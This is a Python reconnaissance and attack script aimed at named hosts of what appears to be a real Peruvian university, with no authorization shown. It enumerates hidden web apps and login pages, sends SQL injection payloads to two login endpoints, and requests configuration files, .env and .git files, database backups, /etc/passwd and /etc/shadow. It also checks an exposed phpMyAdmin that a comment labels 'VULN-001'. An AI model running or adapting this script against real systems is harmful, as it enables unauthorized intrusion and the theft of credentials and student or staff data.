#!/usr/bin/env python3
import requests, urllib3, re
urllib3.disable_warnings()

s = requests.Session()
s.verify = False
s.headers.update({'User-Agent': 'Mozilla/5.0'})

# ============================================
# 1. PROBAR WEBDocente URL
# ============================================
print("=== 1. PROBANDO WebDocente ===")
urls_webdocente = [
    'https://registro.uns.edu.pe:80/WebDocente/',
    'https://registro.uns.edu.pe:80/WebDocente/faces/login.xhtml',
    'https://registro.uns.edu.pe:80/WebDocente/faces/index.xhtml',
    'https://registro.uns.edu.pe/WebDocente/',
    'https://registro.uns.edu.pe/WebDocente/faces/login.xhtml',
]
for url in urls_webdocente:
    try:
        r = s.get(url, timeout=5)
        tc = re.sub(r'<[^>]+>', ' ', r.text)
        tc = re.sub(r'\s+', ' ', tc).strip()
        print(f"  {url} -> {r.status_code}, len={len(r.text)}")
        if len(r.text) > 500 and 'error' not in tc.lower():
            print(f"  [!] PODRIA SER LA APP! Preview: {tc[:200]}")
    except:
        print(f"  {url} -> ERROR")

# ============================================
# 2. PROBAR TODAS LAS WEB APPS ENCONTRADAS
# ============================================
print("\n=== 2. BUSCANDO TODAS LAS WEB APPS ===")
apps_to_test = [
    'WebDocente', 'WebAlumno', 'WebPasaporte', 'WebSistema',
    'WebAdmin', 'WebDocentes', 'WebEstudiantes',
    'WebModulo', 'WebPortal', 'WebMain',
    'Docente', 'Alumno', 'Estudiante',
    'Docentes', 'Administracion', 'Sistema',
    'Dashboard', 'Principal', 'Home', 'Portal',
]
for app in apps_to_test:
    url = f'https://registro.uns.edu.pe:80/{app}/faces/login.xhtml'
    try:
        r = s.get(url, timeout=3)
        if r.status_code == 200 and len(r.text) > 1000:
            tc = re.sub(r'<[^>]+>', ' ', r.text)
            tc = re.sub(r'\s+', ' ', tc).strip()
            print(f"  [ENCONTRADA] {url} -> {r.status_code}, len={len(r.text)}")
            if 'logueo' in tc.lower() or 'login' in tc.lower():
                print(f"    Es una pagina de login!")
    except:
        pass

# ============================================
# 3. BUSCAR BASE DE DATOS - SQL Injection
# ============================================
print("\n=== 3. PROBANDO SQL INJECTION ===")
# Test login forms for SQL injection
sql_tests = [
    "' OR '1'='1",
    "' OR '1'='1' --",
    "' OR 1=1 --",
    "admin' --",
    "' UNION SELECT NULL --",
    "' OR ''='",
]

# Test SIIGAA j_security_check
for sqli in sql_tests:
    s2 = requests.Session()
    s2.verify = False
    s2.headers.update({'User-Agent': 'Mozilla/5.0'})
    # URL encode the payload
    import urllib.parse
    encoded = urllib.parse.quote(sqli)
    r = s2.post('https://registro.uns.edu.pe/udemsi/j_security_check',
                   data={'j_username': sqli, 'j_password': sqli},
                   timeout=5, allow_redirects=True)
    if len(r.text) > 18000 and 'control' in r.text.lower():
        print(f"  [!] POSSIBLE SQLI: j_username={sqli}")
        print(f"      Status: {r.status_code}, len={len(r.text)}")

# Test WebPasaporte login
for sqli in sql_tests[:3]:
    s3 = requests.Session()
    s3.verify = False
    s3.headers.update({'User-Agent': 'Mozilla/5.0'})
    encoded = urllib.parse.quote(sqli)
    r = s3.post('https://sistemas.uns.edu.pe/WebPasaporte/faces/login.xhtml',
                   data={'j_username': sqli, 'j_password': sqli},
                   timeout=5, allow_redirects=True)
    if len(r.text) > 15000:
        print(f"  [WebPasaporte] sqli={sqli} -> len={len(r.text)}")

# ============================================
# 4. BUSCAR ARCHIVOS DE CONFIGURACION DE BD
# ============================================
print("\n=== 4. BUSCANDO ARCHIVOS DE CONFIGURACION DE BD ===")
config_files = [
    'config.php', 'config.inc.php', 'database.php', 'db_config.php',
    'config.php.bak', 'config.inc.php.bak', 'database.yml',
    '.env', '.env.bak', 'settings.py', 'database.conf',
    'connection.php', 'connect.php', 'db_connect.php',
    'my.cnf', 'my.ini', 'mysql.conf',
    'web.config', 'application.properties',
    '/etc/passwd', '/etc/shadow',
]
for cfg in config_files:
    url = f'https://registro.uns.edu.pe/udemsi/{cfg}'
    try:
        r = s.get(url, timeout=3)
        if r.status_code == 200 and len(r.text) > 0 and len(r.text) < 50000:
            tc = r.text[:200]
            print(f"  [!] ENCONTRADO: {url} -> {r.status_code}, len={len(r.text)}")
            print(f"      {tc[:150]}")
    except:
        pass

# Also try .git, .htaccess, etc
for cfg in ['.git/config', '.htaccess', '.env', 'backup.zip', 'backup.tar.gz', 'database.sql']:
    url = f'https://registro.uns.edu.pe/udemsi/{cfg}'
    try:
        r = s.get(url, timeout=3)
        if r.status_code == 200:
            print(f"  [!] ENCONTRADO: {url} -> {r.status_code}, len={len(r.text)}")
    except:
        pass

# ============================================
# 5. VERIFICAR phpMyAdmin (VULN-001)
# ============================================
print("\n=== 5. VERIFICAR phpMyADMIN ===")
# Already confirmed: orcl.uns.edu.pe has phpMyAdmin 5.2.3 exposed
# Check what databases are accessible
pma_urls = [
    'https://orcl.uns.edu.pe/phpmyadmin/',
    'https://orcl.uns.edu.pe/phpMyAdmin/',
    'https://orcl.uns.edu.pe/phpmyadmin/index.php',
    'https://orcl.uns.edu.pe/setup/',
]
for url in pma_urls:
    try:
        r = s.get(url, timeout=5)
        if r.status_code == 200:
            tc = re.sub(r'<[^>]+>', ' ', r.text)
            tc = re.sub(r'\s+', ' ', tc).strip()
            print(f"  [!] phpMyAdmin: {url} -> {r.status_code}, len={len(r.text)}")
            # Look for database info
            if 'database' in tc.lower() or 'mysql' in tc.lower():
                print(f"      Contiene info de BD")
    except:
        pass

# ============================================
# 6. BUSCAR BACKUPS, DUMPS, DB FILES
# ============================================
print("\n=== 6. BUSCANDO BACKUPS DE BASE DE DATOS ===")
backup_patterns = [
    'backup.sql', 'backup.zip', 'backup.tar.gz', 'backup.bak',
    'dump.sql', 'dump.zip', 'export.sql', 'export.zip',
    'database.sql', 'database.zip', 'db.sql', 'db.zip',
    'backup', 'dump', 'export', 'backup.sql.gz',
]
for bp in backup_patterns:
    url = f'https://registro.uns.edu.pe/udemsi/{bp}'
    try:
        r = s.get(url, timeout=3)
        if r.status_code == 200 and len(r.text) > 100:
            print(f"  [!] BACKUP ENCONTRADO: {url} -> {r.status_code}, len={len(r.text)}")
    except:
        pass

# ============================================
# 7. BUSCAR EN TODOS LOS PUERTOS Y RUTAS
# ============================================
print("\n=== 7. RUTAS POSIBLES EN orcl.uns.edu.pe ===")
orcl_paths = [
    '/', '/phpmyadmin/', '/phpMyAdmin/', '/mysql/',
    '/admin/', '/panel/', '/db/', '/database/',
    '/sql/', '/config/', '/setup/',
]
for path in orcl_paths:
    try:
        r = s.get(f'https://orcl.uns.edu.pe{path}', timeout=3)
        if r.status_code == 200:
            tc = re.sub(r'<[^>]+>', ' ', r.text)
            tc = re.sub(r'\s+', ' ', tc).strip()
            print(f"  {path} -> {r.status_code}, len={len(r.text)}")
    except:
        pass

print("\n=== LISTO ===")
